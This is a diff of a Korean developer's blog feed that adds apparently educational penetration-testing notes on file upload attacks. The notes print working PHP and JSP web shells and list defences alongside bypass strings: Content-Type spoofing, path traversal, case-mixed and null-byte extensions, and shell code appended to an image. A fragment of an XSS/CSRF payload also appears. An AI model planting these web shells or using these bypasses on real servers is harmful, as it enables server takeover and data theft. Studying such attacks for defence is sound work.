@@ -1,4 +1,216 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-06-04T17:58:05+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyEnOuyhCA6IOu5hOygleyDgSDtjpjsnbTsp4Ag7YyM652866-47YSw66W8IOuEo-ydgCDsiJjrn4kg7JqU7LKtXG7shJzrsoQgLT4-IOuCtOu2gCDshJzrsoQgOiDrgrTrtoAg7Y6Y7J207KeAIOyalOyyrVxu64K067aAIOyEnOuyhCAtPj4g7ISc67KEIDog64K067aAIO2OmOydtOyngCDsnZHri7VcbuyEnOuyhCAtPj4g6rO16rKp7J6QIDog64K067aAIO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">웹 서버 만들기(15) 게시글 좋아요 및 정렬 기능 만들기</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C15/" rel="alternate" type="text/html" title="웹 서버 만들기(15) 게시글 좋아요 및 정렬 기능 만들기" /><published>2023-06-04T00:00:00+09:00</published><updated>2023-06-04T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C15</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C15/"><![CDATA[<h2 id="서버-환경">서버 환경</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-06-05T21:36:11+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyEnOuyhCA6IOu5hOygleyDgSDtjpjsnbTsp4Ag7YyM652866-47YSw66W8IOuEo-ydgCDsiJjrn4kg7JqU7LKtXG7shJzrsoQgLT4-IOuCtOu2gCDshJzrsoQgOiDrgrTrtoAg7Y6Y7J207KeAIOyalOyyrVxu64K067aAIOyEnOuyhCAtPj4g7ISc67KEIDog64K067aAIO2OmOydtOyngCDsnZHri7VcbuyEnOuyhCAtPj4g6rO16rKp7J6QIDog64K067aAIO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">File Upload 공격 세부 정리</title><link href="http://localhost:4000/FileUpload%EA%B3%B5%EA%B2%A9%EC%84%B8%EB%B6%80%EC%A0%95%EB%A6%AC/" rel="alternate" type="text/html" title="File Upload 공격 세부 정리" /><published>2023-06-05T00:00:00+09:00</published><updated>2023-06-05T23:13:00+09:00</updated><id>http://localhost:4000/FileUpload%EA%B3%B5%EA%B2%A9%EC%84%B8%EB%B6%80%EC%A0%95%EB%A6%AC</id><content type="html" xml:base="http://localhost:4000/FileUpload%EA%B3%B5%EA%B2%A9%EC%84%B8%EB%B6%80%EC%A0%95%EB%A6%AC/"><![CDATA[<h2 id="file-upload-공격이란">File Upload 공격이란?</h2>
+<ul>
+  <li>공격자가 임의의 파일을 업로드할 수 있는 공격이다.</li>
+  <li>웹쉘을 서버에 업로드하여 서버를 장악할 수 있다.</li>
+</ul>
+
+<h2 id="웹쉘-이란">웹쉘 이란?</h2>
+<ul>
+  <li>서버측에서 실행될 수 있는 코드이다.</li>
+  <li>php, jsp, asp, python 등이 있다. 서버의 환경에 따라 달라진다.</li>
+  <li>서버환경에 맞게 웹 쉘을 제작하여야 한다.</li>
+</ul>
+
+<h3 id="php-웹-쉘">PHP 웹 쉘</h3>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h3 id="jsp-웹-쉘">JSP 웹 쉘</h3>
+
+<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%@ page </span><span class="na">import=</span><span class="s">"java.io.*"</span> <span class="nt">%&gt;</span>
+<span class="nt">&lt;%</span>
+<span class="k">try</span> <span class="o">{</span>
+<span class="err"> </span> <span class="err"> </span> <span class="nc">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">));</span>
+<span class="err"> </span> <span class="err"> </span> <span class="nc">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+<span class="err"> </span> <span class="err"> </span> <span class="kt">int</span> <span class="n">c</span><span class="o">;</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">while</span><span class="o">((</span><span class="n">c</span><span class="o">=</span><span class="n">in</span><span class="o">.</span><span class="na">read</span><span class="o">())!=-</span><span class="mi">1</span><span class="o">){</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">out</span><span class="o">.</span><span class="na">print</span><span class="o">((</span><span class="kt">char</span><span class="o">)</span><span class="n">c</span><span class="o">);</span>
+<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">in</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">try</span> <span class="o">{</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
+<span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
+<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
+<span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
+<span class="o">}</span>
+<span class="nt">%&gt;</span>
+</code></pre></div></div>
+
+<h2 id="공격-성공을-위한-중요-point">공격 성공을 위한 중요 Point!</h2>
+<ul>
+  <li>공격자는 웹 서버에서 동작할 수 있는 파일을 올릴 수 있어야한다. (  jsp, php, asp, python 등등 )</li>
+  <li>공격자는 업로드한 파일을 실행시킬 수 있어야한다.</li>
+</ul>
+
+<h2 id="공격-유형">공격 유형</h2>
+
+<h3 id="소스코드-탈취">소스코드 탈취</h3>
+<ul>
+  <li>소스코드 안에 DB의 계정정보가 적혀있을 수 있다. ( DB 서버 아이디 , 비밀번호 ) 이러한 정보들을 통해 서버의 DB 데이터를 탈취하는 것이다.</li>
+</ul>
+
+<h3 id="reverse-shelll">Reverse Shelll</h3>
+<ul>
+  <li>웹 서버에서 공격자의 특정 포트와 연결하는 공격이다.</li>
+  <li>방화벽으로 외부(공격자)에서 서버로 들어오는 요청은 잘 막혀있다. ( ip and port number )</li>
+  <li>하지만 서버에서 외부(공격자) 즉 나가는 포트는 잘 안막혀 있다. 왜냐하면 외부 API가 어떤 포트를 사용하는지 모르기 때문이다. 443 ( https ) 포트는 항상 열려있을 가능성이 높다.</li>
+</ul>
+
+<h3 id="deface-공격">Deface 공격</h3>
+<ul>
+  <li>화면 변조 공격이다.</li>
+  <li>공격자가 웹 서버를 마음로 바꾸고 해킹을 성공했음을 알리는 공격이다. 해킹을 성공했다는 실력 과시로 활용된다.</li>
+  <li>해당 공격을 당했을 때 서버의 피해는 심각하지 않다. 하지만 웹 서버의 보안이 취약하다는 뜻이다.</li>
+</ul>
+
+<h2 id="file-upload-공격-방어법">File Upload 공격 방어법</h2>
+
+<h3 id="파일-업로드-위치">파일 업로드 위치</h3>
+<ul>
+  <li>파일 업로드 위치를 웹 서버와 물리적으로 분리시켜 준다.</li>
+  <li>공격자는 웹 링크를 통해 서버에 업로드한 파일에 접속할 수 없다.</li>
+</ul>
+
+<h3 id="업로드-폴더-실행-막기">업로드 폴더 실행 막기</h3>
+<ul>
+  <li>특정 폴더에서 웹 서버에서 실행되는 코드의 실행을 막는 것이다.</li>
+  <li>공격자가 업로드한 파일( 웹쉘 )에 링크를 통해 직접적으로 접근이 가능해도 서버측에서는 해당 파일을 실행하지 않고 파일 내용 그대로를 보여주게 된다.</li>
+</ul>
+
+<h3 id="웹-서버-계정-접근-권한">웹 서버 계정 접근 권한</h3>
+<ul>
+  <li>웹 서버 계정의 접근 권한을 제한하기.</li>
+  <li>외부에서 웹 쉘 공격을 성공하여도 웹 계정은 접근 권한이 없어 다른 곳으로 접근을 못한다.</li>
+</ul>
+
+<h3 id="content-type-검사">Content-Type 검사</h3>
+<ul>
+  <li>서버에서 업로드 파일의 업로드 요청이 올 때 <strong>Content-Type</strong>을 검사하여 서버에 저장하여도 괜찮은 파일인지 확인한다.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php 파일
+content-type: text/php
+
+이미지 파일
+content-type: image/jpeg
+</code></pre></div></div>
+
+<h3 id="확장자-필터링">확장자 필터링</h3>
+<ul>
+  <li>서버에서 허용되지 않은 확장자 파일이 업로드 되면 서버에 저장하지 않는다. 즉 업로드에 실패하게 된다.</li>
+  <li>예를들어 파일 확장자가 <code class="language-plaintext highlighter-rouge">.jpeg</code> , <code class="language-plaintext highlighter-rouge">.png</code> 인 것만 서버 저장을 허용 한다고 설정하는 것이다.</li>
+</ul>
+
+<h3 id="file-시그니쳐-검사">File 시그니쳐 검사</h3>
+<ul>
+  <li>업로드된 파일의 시그니처를 검사하여 허용된 파일 인지 아닌지 확인한다. 이런 확인을 통해 허용된 파일이면 서버에 저장하고 허용되지 않은 파일이면 저장하지 않는다.</li>
+</ul>
+
+<h2 id="방어법-bypass">방어법 Bypass</h2>
+
+<h3 id="content-type-바꾸기">Content-Type 바꾸기</h3>
+<ul>
+  <li>직접 content-type을 서버에서 허용하는 값으로 바꾸어 서버에서 정상적인 파일이 업로드되고 있다고 생각하게 한다.</li>
+  <li>burp-suite의 intercept 기능을 이용하여 실제 업로드 하는 파일은 이미지가 아니지만 content-type을 공격자가 임의로 변경하여 정상적인 이미지 파일을 업로드하는 것으로 서버를 속일 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/72120adb-5190-48a9-a615-b77f644698b4" alt="Pasted image 20230605174255" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/3358a51e-29ad-4bad-90df-16379e7d796d" alt="Pasted image 20230605174427" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/56ade12a-3454-47f8-9acf-58be232d8b35" alt="Pasted image 20230605174447" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0f9dd0c8-2173-4141-9aa4-9e2afab9ab6a" alt="Pasted image 20230605174534" /></li>
+</ul>
+
+<h3 id="traversal">Traversal</h3>
+<ul>
+  <li>파일이 업로드되는 경로를 사용자가 임의로 바꾼다.</li>
+  <li>만약 서버가 업로드 폴더에 저장된 업로드 파일 실행이 안되게 막아 놓는다면 공격자는 업로드 폴더에 바로 접근이 가능하더라도 웹 쉘 공격을 성공시킬 수 없다.</li>
+  <li>업로드 파일 이름을 바꾸어 파일 저장 위치를 공격자가 임의로 바꾼다. 공격자가 링크를 통해 바로 접근가능 하면서 파일 실행이 되는 임의의 위치로 설정한다.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>업로드 파일 이름
+test.img
+
+traversal 을 이용한 파일 이름
+../test.img
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>정상적으로 파일 업로드 하였을 때 파일 저장 위치.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/c4d514ea-6685-4089-be49-c216697604c1" alt="Pasted image 20230605183831" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/53f07950-06a8-426d-afb5-054230bb1628" alt="Pasted image 20230605183720" /></p>
+  </li>
+  <li>
+    <p>파일 이름을 변경하여 임의로 업로드 위치 바꾸기. 저장되면 원래 위치의 하위 폴더에 공격자가 업로드한 파일이 저장되었다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/63ff038d-b4bb-41cd-947d-3f57f0d6037f" alt="Pasted image 20230605183905" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2519f6cf-7952-4d70-b0b2-df817bb16c94" alt="Pasted image 20230605184010" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2b863d87-6983-4aa4-90fc-c50ea70622ab" alt="Pasted image 20230605184041" /></p>
+  </li>
+</ul>
+
+<h3 id="블랙리스트-기반-필터링-우회">블랙리스트 기반 필터링 우회</h3>
+<ul>
+  <li>필터링 처리되어 있는 단어를 대소문자로 바꿔가며 우회되는지 확인한다.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php 가 필터링 처리되어 있으면
+pHp
+PhP
+pHP
+
+jsp
+Jsp
+jsP
+JsP
+</code></pre></div></div>
+
+<ul>
+  <li>필터링으로 설정된 단어를 빈칸으로 변경하는 서버에서는 필터링 단어를 한번더 써주어 우회를 시도한다.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phphpp =&gt; php
+</code></pre></div></div>
+
+<h3 id="확장자-우회-방법">확장자 우회 방법</h3>
+<ul>
+  <li>서버가 앞에서 부터 확장자를 검사할 때.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>test.jpeg.php
+</code></pre></div></div>
+
+<ul>
+  <li>서버가 뒤에서 부터 확장자를 검사할 때. null 바이트를 이용하기.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%00 : null 바이트
+test.php%00.jpeg : 리눅스
+
+test.php:.jpeg : 윈도우
+</code></pre></div></div>
+
+<ul>
+  <li>다른 확장자명 사용하기.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php &gt; .php5
+jsp &gt; .jspx ( .jsp 와 문법이 다르다. )
+</code></pre></div></div>
+
+<h3 id="file-시그니처-우회방법">File 시그니처 우회방법</h3>
+<ul>
+  <li>허용된 파일 내용 맨뒤에 웹쉘 코드를 넣어주기. 즉 이미지 안에 웹쉘 코드를 넣는 것이다.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~PNG
+....
+
+웹 쉘 코드 넣기.
+</code></pre></div></div>
+
+<h2 id="후기">후기</h2>
+<ul>
+  <li>파일 업로드 취약점이 무엇인지 관하여 알아보았고, 파일 업로드 취약점을 이용한 공격이 어떠한 것들이 있는지 알아보았다. 방어법과 방어법 우회 방법도 알아보았다. 리버스 쉘과 deface 라는 처음보는 공격방식에 대하여 알아보는 좋은 계기가 되었다.</li>
+  <li>파일 업로드 공격을 정리하면서 내가 만든 웹 서버의 파일 업로드 부분에 취약점이 있는지 확인해 보았다. 파일 업로드 부분에 취약점이 없을 줄 알았지만 Traversal 우회기법을 사용하여 업로드 파일 저장위치를 변경할 수 있는 취약점을 발견할 수 있었다. 따라서 다음 글에는 이 취약점을 이용하여 deface 공격 이나 리버스쉘 공격을 실습을 통해 정리해볼 예정이다.</li>
+</ul>
+
+<h2 id="참고-사이트">참고 사이트</h2>
+<ul>
+  <li><a href="https://mokpo.tistory.com/355">Null byte (tistory.com)</a></li>
+  <li><a href="https://www.boannews.com/media/view.asp?idx=55936">왕초보를 위한 용어 풀이, 디페이스(Deface) 공격이란? (boannews.com)</a></li>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="file upload" /><category term="웹쉘" /><summary type="html"><![CDATA[File Upload 공격에 대하여 자세히 알아보자.]]></summary></entry><entry><title type="html">웹 서버 만들기(15) 게시글 좋아요 및 정렬 기능 만들기</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C15/" rel="alternate" type="text/html" title="웹 서버 만들기(15) 게시글 좋아요 및 정렬 기능 만들기" /><published>2023-06-04T00:00:00+09:00</published><updated>2023-06-04T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C15</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C15/"><![CDATA[<h2 id="서버-환경">서버 환경</h2>
 <ul>
   <li>oracle db 서버</li>
   <li>우분투 22.04.2 LTS 웹 nginx 서버</li>
@@ -1725,934 +1937,4 @@ id'&lt;/script&gt;&lt;iframe style="position:absolute;border:none;overflow:hidde
   <li>csrf 공격을 예방하기 위하여 서버에서는 csrf 토큰을 사용하였지만 서버의 xss 취약점과 iframe 태그를 이용하여 csrf 토큰 방어법을 우회하였다.</li>
   <li>fetch 함수를 통해 POST 전송을 보다 쉽게할 수 있었다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d286ca44-4185-4277-ad72-e8fb5bdee8b3" alt="Pasted image 20230525190729" /></li>
   <li>사용자는 정상적으로 게시글을 확인하였다고 느낀다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/3afde40a-f935-45fa-b5a2-dd7038de3ebd" alt="Pasted image 20230525191153" /></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="csrf" /><category term="xss" /><summary type="html"><![CDATA[CSRF 실습 문제 풀어보기]]></summary></entry><entry><title type="html">웹 서버 만들기(13) 업로드 다운로드 조회수</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C13/" rel="alternate" type="text/html" title="웹 서버 만들기(13) 업로드 다운로드 조회수" /><published>2023-05-25T00:00:00+09:00</published><updated>2023-05-30T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C13</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C13/"><![CDATA[<h2 id="파일-업로드">파일 업로드</h2>
-<ul>
-  <li>Part API를 이용하여 파일 업로드를 구현하였다.</li>
-</ul>
-
-<h3 id="단일-파일-최대-용량-설정-nginx">단일 파일 최대 용량 설정 (Nginx)</h3>
-<ul>
-  <li><code class="language-plaintext highlighter-rouge">/etc/nginx/nginx.conf</code> 에서 단일 파일 최대 용량을 <strong>500MB</strong>로 설정하였다.</li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>... 생략 ...
-http {
-        client_max_body_size 500M;
-        ... 생략...
-}
-</code></pre></div></div>
-
-<ul>
-  <li>업로드 할 단일 파일 크기가 500MB를 넘으면 오류가 발생한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/359959d7-a37f-4f13-883d-f57251175668" alt="Pasted image 20230524223827" /></li>
-</ul>
-
-<p><br /></p>
-
-<h3 id="게시글-새로-저장">게시글 새로 저장</h3>
-<h4 id="jsp">JSP</h4>
-<h5 id="설명">설명</h5>
-<ul>
-  <li>file 선택을 위한 <code class="language-plaintext highlighter-rouge">input</code> 태그에서 type 속성 값을 <code class="language-plaintext highlighter-rouge">file</code>로 설정한다.</li>
-  <li><code class="language-plaintext highlighter-rouge">form</code> 태그에서 enctype 속성 값을 <code class="language-plaintext highlighter-rouge">multipart/form-data</code>로 해준다. 대용량 파일을 서버로 보내기 위한 설정이다.</li>
-  <li>한 게시물당 최대 3개 까지 첨부파일을 저장할 수 있지만 아직 한 게시물에 동시에 파일 추가되는 기능은 구현하지 않았다.</li>
-</ul>
-
-<h5 id="과정">과정</h5>
-
-<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyCrOyaqeyekCA6IOq4gOyTsOq4sCDrsoTtirwg7YG066atLlxu7IKs7Jqp7J6QIC0-PiDsgqzsmqnsnpAgOiDqsozsi5zquIAg7J6R7ISxIOuwjyDssqjrtoDtjIzsnbwg7ISg7YOdLiDsoIDsnqUg67KE7Yq8IO2BtOumrS5cbuyCrOyaqeyekCAtPj4g7ISc67KEIDog7KCc66qpLCDrs7jrrLgg6re466as6rOgIO2MjOydvOydhCDshJzrsoTroZwg7KCE7IahLlxu7ISc67KEIC0-PiBEQiDshJzrsoQgOiDsoJzrqqksIOuzuOusuCDsoIDsnqUg7JqU7LKtLlxuREIg7ISc67KEIC0-PiDshJzrsoQgOiDsoIDsnqUg7JmE66OMIOydkeuLtVxu7ISc67KEIC0-PiDshJzrsoQgOiDssqjrtoDtjIzsnbwg7KCA7J6lLlxu7ISc67KEIC0-PiDsgqzsmqnsnpAgOiDqsozsi5zquIAg7J6R7ISxIOyEseqztSDrmJDripQg7Iuk7YyoIOyXrOu2gCDsoITshqEuIiwibWVybWFpZCI6bnVsbH0" /></p>
-
-<ol>
-  <li>사용자가 글쓰기 버튼을 클릭한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/10e6984c-9fc0-43fe-9a42-2558b6d7e3a8" alt="Pasted image 20230524224712" /></li>
-  <li>제목과 본문을 작성한다. 그리고 파일선택 버튼을 클릭하여 업로드할 파일을 선택하여준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/78a2bee2-f34a-415c-85ef-5aa12523df6e" alt="Pasted image 20230524225111" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/74bddbb7-3f3c-4ecc-9270-fc9264f4a6cc" alt="Pasted image 20230524224837" /></li>
-  <li>게시글 작성이 완료되고 저장 버튼을 누르면 게시글과 첨부파일이 서버로 전송되어 저장된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8df6dcc9-9f2b-4abb-8aef-c0e339cd73e1" alt="Pasted image 20230524225050" /></li>
-  <li>게시글 확인 <br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/50ff532b-532c-4e5e-a720-35a7ae8aed19" alt="Pasted image 20230524225214" /></li>
-  <li>서버에 파일이 잘 업로드 된 것을 확인할 수 있다.</li>
-</ol>
-
-<h5 id="코드--notice_writejsp-">코드 ( notice_write.jsp )</h5>
-
-<ul>
-  <li>form 의 enctype 속성을 추가하였고, input의 type 속성을 <code class="language-plaintext highlighter-rouge">file</code>로 해주었다.</li>
-</ul>
-
-<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>... 생략 ...
-<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">action=</span><span class="s">"${noticeBoardURL}"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
-... 생략 ...
-<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"UPLOAD_FILE"</span><span class="nt">/&gt;</span>
-... 생략 ...
-</code></pre></div></div>
-
-<h4 id="servlet">Servlet</h4>
-<h5 id="설명-1">설명</h5>
-<ul>
-  <li>사용자가 전송한 제목, 본문은 DB서버에 저장하고 파일은 웹 서버에 저장한다.</li>
-  <li>POST 요청으로 들어온다.</li>
-  <li>최대 3개의 파일 까지 서버에 저장이 가능하다.</li>
-  <li><code class="language-plaintext highlighter-rouge">part.getHeader("Content-Disposition").contains("filename=")</code> 을 통해 파일인지 아니면 그냥 텍스트인지 구분한다.</li>
-  <li>파일이름이 없으면 서버에 파일을 저장하지 않는다.</li>
-</ul>
-
-<h5 id="과정-1">과정</h5>
-<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOygnOuqqSwg67O466y4LCDssqjrtoDtjIzsnbwg7KCE7IahXG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOygnOuqqSwg67O466y4IGRi7JeQIOyggOyepSDsmpTssq0uXG5EQiDshJzrsoQgLT4-IOyEnOuyhCA6IOyggOyepSDsmYTro4wg7J2R64u1Llxu7ISc67KEIC0-PiDshJzrsoQgOiDssqjrtoDtjIzsnbwg7KCA7J6lLlxu7ISc67KEIC0-PiDsgqzsmqnsnpAgOiDqsozsi5zrrLwg7KCA7J6lIOyEseqztSDrmJDripQg7Iuk7YyoIOyXrOu2gCDsoITshqEiLCJtZXJtYWlkIjpudWxsfQ" /></p>
-
-<ol>
-  <li>사용자가 제목, 본문 그리고 파일을 첨부하여 POST 전송으로 서버에 보낸다.</li>
-  <li>제목과 본문을 DB서버에 저장해준다.</li>
-  <li>게시물 저장 시간과 게시물 번호를 이용하여 게시문 파일을 저장하기 위한 폴더를 만들어준다.</li>
-  <li>폴더에 사용자가 첨부한 파일을 저장한다. 최대 저장가능한 파일 수를 3개로 설정하였다.</li>
-  <li>하지만 만약 파일을 서버에 저장 중 오류가 발생한다면 게시글 즉 제목과 본문은 저장되고 파일만 서버에 저장이 안된다.</li>
-</ol>
-
-<h5 id="코드--mainpagejava-">코드 ( MainPage.java )</h5>
-
-<ul>
-  <li>사용자가 업로드한 파일을 웹 서버에 바로 저장해 준다.</li>
-</ul>
-
-<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kd">final</span> <span class="kt">int</span> <span class="no">MAX_FILE_NUM</span> <span class="o">=</span> <span class="mi">2</span><span class="o">;</span> <span class="c1">// 최대 저장 가능한 파일수-1</span>
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainPage</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
-	<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-	<span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">uriSearch</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">{</span>
-	    <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-		<span class="c1">// 글 저장</span>
